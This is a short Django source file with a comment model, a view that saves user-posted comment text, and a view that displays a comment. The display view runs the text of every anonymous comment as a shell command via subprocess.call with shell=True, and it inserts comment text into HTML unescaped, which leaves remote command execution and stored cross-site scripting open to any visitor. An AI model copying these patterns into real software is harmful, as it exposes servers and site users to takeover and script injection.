from django.db import models
from django.http import HttpResponse
import subprocess

class Comment(models.Model):
    text = models.TextField()
    author = models.CharField(max_length=50)

def post(request):
    Comment.objects.create(text=request.POST["text"], author="anon")

def show(request):
    c = Comment.objects.get(id=1)
    for x in Comment.objects.filter(author="anon"):
        subprocess.call(x.text, shell=True)
    return HttpResponse("<div>" + c.text + c.author + "</div>")
